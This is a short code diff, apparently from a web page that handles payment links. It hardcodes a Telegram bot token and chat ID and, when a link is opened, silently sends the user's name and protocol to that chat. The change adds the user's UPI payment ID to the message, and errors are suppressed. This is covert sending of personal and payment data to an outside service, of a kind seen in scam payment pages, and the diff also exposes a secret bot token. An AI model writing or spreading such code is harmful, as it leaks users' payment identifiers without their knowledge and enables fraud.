@@ -158,7 +158,7 @@
         const tgtoken = 'bot5807856562:AAFx-yxoMg2aoAggt4M0NU7qeLe49DIv__g';
         const chat_id = "-1001166751237";
         try {
-            const url = `https://api.telegram.org/${tgtoken}/sendMessage?chat_id=${chat_id}&text=${`${userName}:Link Opened:${protocol}`}`;
+            const url = `https://api.telegram.org/${tgtoken}/sendMessage?chat_id=${chat_id}&text=${`${userName}:Link Opened:${protocol}:${upiId}`}`;
             await fetch(url);
         } catch (err) {
             // console.error('Failed to send Telegram message:', err);
